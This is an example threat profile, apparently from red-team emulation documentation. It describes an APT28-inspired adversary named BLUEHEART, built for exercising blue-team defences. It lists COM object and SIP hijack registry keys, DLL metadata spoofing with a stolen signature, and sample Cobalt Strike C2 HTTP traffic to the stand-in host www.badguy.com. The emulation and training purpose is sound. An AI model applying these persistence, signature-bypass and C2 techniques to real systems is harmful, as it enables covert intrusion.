---
id: blueheart
title: Threat Profile - BLUEHEART
description: >
  BLUEHEART threat profile example
---

# Threat Profile (BLUEHEART)

:::tip
This example can be used as a reference and would generate as part of threat decomposition and threat profile design.
:::

## Description

BLUEHEART was inspired on APT28 malware using CobaltStrike malleable C2 profiles, custom metadata, and TTPs. 

## Goal and Intent

Emulate TTPs of a realistic adversary to exist on a target network and provide a blue team the opportunity to exercise defensive TTPs.

## Key IOCs

- User level C2 Agent
- Custom CobaltStrike Malleable C2 profile to mimic CHOPSTICK IOCs
- Persistence: COM Object Hijacking
- File: `C:\Users\Public\Libraries\apphelp.dll`
- HTTP Traffic to www.badguy.com
- Beacons every 60 seconds - 30% jitter User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
- Modified Date/Time Stamp (Using [MetaTwin](https://github.com/threatexpress/metatwin))
- Custom Binary metadata using valid Microsoft signature
- Modified SubjectInterfacePackage (SIP) for Signature Verification Bypass

__Disk Indicators__

```
C:\Users\Public\Libraries\apphelp.dll
```

__Metadata__

```
File: C:\windows\system32\apphelp.dll
InternalName: Apphelp
OriginalFilename: Apphelp
FileVersion: 10.0.10586.0(rs1_release.151029-
1700)
FileDescription:ApplicationCompatibility Client Library
Product: Microsoft® Windows® Operating System
ProductVersion: 10.0.10586.0
Debug: False
Patched: False
PreRelease: False
PrivateBuild: False
SpecialBuild: False
Language: English (United States)
```

__Digital Signature__: Stolen from ```c: \windows\system32\taskhostw.exe```

__Time Stamp__: 10/30/2015 02:17 AM

__File Size__: 427960

__MD5 Hash__: A31B0124152CBB60C68DCFEBC9C4909C

__Registry Modifications__

COM Object Hijack

```
Key: HKCU:\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InProcServer32'    
Property: (Default)
Property: ThreadingModel
```

SIP Hijack

```
Key: HKLM:\SOFTWARE\Microsoft\Cryptography\OID\EncodingType0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}
```

__Network Indicators__

HTTP Traffic C2 commands through www.badguy.com

Sample HTTP GET Request

```
GET /index.html HTTP/1.1
Accept-Language: en-US,en;q=0.5
Host: www.badguy.com
Proxy-Connection: Keep-Alive
Cookie: session=sE5QGSAMTumuA/3mNmqe5g==
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64;
Trident/7.0; rv:11.0) like Gecko
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Type: text/html
Vary: Accept-Encoding
Server: IIS 5.0
Connection: close
Content-Length: 218
<html><head><meta http-equiv="refresh" content=0
url="http://www.badguy.com"><title>Bad Guy Website</title></html>fylWlO
/d4uBN6b0hPlhUDYRcjdjaifkaukstXQZwO3PZpCzTTR
FTERSAITNWz2xTNndMcZgPg==
```

Sample HTTP POST Request

```
POST /contact HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Host: www.badguy.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=NzQ4NTU=
Content-Length: 41
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64;Trident/7.0; rv:11.0) like Gecko
action=Submit&data=jdagislaga-p0Zw

HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Type: application/octet-stream
Server: IIS 5.0
Connection: close
Content-Length: 40
yF8u8YkdbbWNGWm5gUgaalgOOSfZDX2lnQl5qZEF
```

## C2 Overview

HTTP Traffic on TCP port 80 connecting to www.badguy.com every 60 seconds.

## TTPs (Enumeration, Delivery, Lateral Movement, Privilege Escalation, etc.)

POST-exploitation via Cobalt Strike commands. Enumeration and lateral movement via Cobalt Strike and native Windows commands. Privilege escalation limited and determined POST-exploitation.

## Exploitation

Nothing specific. Operator deploys during after initial access.

## Persistence

User Level persistence where COM Object Handler loads DLL at user logon under taskhostw.exe

```
$Description = "SystemSoundsService"
$CLSID = '{2DEA658F-54C1-4227-AF9B-260AB5FC3543}'
```



